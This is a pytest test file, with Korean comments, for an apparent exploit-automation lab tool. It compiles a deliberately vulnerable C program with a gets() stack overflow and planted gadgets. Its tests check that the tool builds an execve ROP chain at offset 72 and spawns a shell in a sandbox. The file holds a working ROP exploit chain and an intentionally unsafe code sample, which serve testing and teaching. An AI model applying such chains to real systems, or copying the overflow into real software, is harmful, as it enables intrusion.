"""execve syscall ROP 자동 익스: system 없는 바이너리에서 셸 획득까지 증명."""

from __future__ import annotations

import platform
import shutil
import subprocess

import pytest

from pwnable_lab.analyzer.strategy import (
    execve_plan,
    find_syscall_gadget,
    ret2system_plan,
    ret2win_target,
)
from pwnable_lab.api.services import AnalysisService
from pwnable_lab.config import Settings
from pwnable_lab.elf.parser import parse_elf
from pwnable_lab.payload.pack import RopStep, build_overflow
from pwnable_lab.sandbox import SandboxLimits, verify_shell
from pwnable_lab.sandbox.execve import auto_execve

_SUPPORTED = platform.system() == "Linux" and platform.machine() in {"x86_64", "AMD64"}
_HAVE_GCC = shutil.which("gcc") is not None

# system 을 참조하지 않으므로 ret2system 은 불가 — 각 인자 레지스터 pop 가젯 +
# syscall 가젯 + 자체 /bin/sh 문자열을 심어 execve syscall ROP 만 성립하게 한다.
_EXECVE_SRC = """
#include <stdio.h>
__asm__(
  ".global g_gadgets\\n"
  "g_gadgets:\\n"
  " pop %rdi\\n ret\\n"
  " pop %rsi\\n ret\\n"
  " pop %rdx\\n ret\\n"
  " pop %rax\\n ret\\n"
  " syscall\\n ret\\n"
);
char binsh_str[] = "/bin/sh";
void vuln(void){ char buf[64]; gets(buf); }
int main(void){ vuln(); return 0; }
"""

_gated = pytest.mark.skipif(
    not (_SUPPORTED and _HAVE_GCC), reason="Linux/x86-64 + gcc 필요(실제 실행)"
)


def _compile(tmp_path):
    csrc = tmp_path / "execve_target.c"
    csrc.write_text(_EXECVE_SRC)
    out = tmp_path / "execve_target"
    subprocess.run(
        ["gcc", "-fno-stack-protector", "-no-pie", "-o", str(out), str(csrc)],
        check=True,
        capture_output=True,
    )
    return out


@_gated
def test_execve_plan_collects_all_registers(tmp_path):
    img = parse_elf(_compile(tmp_path).read_bytes())
    plan = execve_plan(img)
    assert plan is not None
    for key in ("pop_rdi", "pop_rsi", "pop_rdx", "pop_rax", "binsh", "syscall"):
        assert plan[key] > 0
    # syscall 가젯 주소는 독립 헬퍼와 일치해야 한다.
    assert find_syscall_gadget(img) == plan["syscall"]
    # 이 바이너리는 system 을 링크하지 않으므로 ret2system 은 불가.
    assert ret2system_plan(img) is None
    assert ret2win_target(img) is None


@_gated
def test_auto_execve_core_proves_shell(tmp_path):
    out = _compile(tmp_path)
    result = auto_execve(str(out), offset=72, limits=SandboxLimits())
    assert result["attempted"] is True
    assert result["technique"] == "execve"
    assert result["succeeded"] is True
    assert result["shell_proven"] is True
    assert result["reason"] == "shell-proven"
    assert result["shell_proof"]["shell_spawned"] is True


@_gated
def test_manual_execve_chain_spawns_shell(tmp_path):
    out = _compile(tmp_path)
    plan = execve_plan(parse_elf(out.read_bytes()))
    assert plan is not None
    payload = build_overflow(
        72,
        plan["pop_rdi"],
        bits=64,
        chain=[
            RopStep(plan["binsh"]),
            RopStep(plan["pop_rsi"]),
            RopStep(0),
            RopStep(plan["pop_rdx"]),
            RopStep(0),
            RopStep(plan["pop_rax"]),
            RopStep(59),
            RopStep(plan["syscall"]),
        ],
    )
    proof = verify_shell(
        str(out), payload, marker="PWNPILOT_EXECVE", limits=SandboxLimits()
    )
    assert proof.shell_spawned is True
    assert "PWNPILOT_EXECVE" in proof.output.decode("utf-8", "replace")


@_gated
def test_auto_exploit_selects_execve_and_proves_shell(tmp_path):
    out = _compile(tmp_path)
    service = AnalysisService(
        Settings(sandbox_execution_enabled=True, sandbox_executor="inprocess")
    )
    result = service.auto_exploit(out.read_bytes(), pattern_length=400)
    v = result["verification"]
    assert v["technique"] == "execve"
    assert v["succeeded"] is True
    assert v["shell_proven"] is True
    assert v["reason"] == "shell-proven"
    assert v["shell_proof"]["shell_spawned"] is True
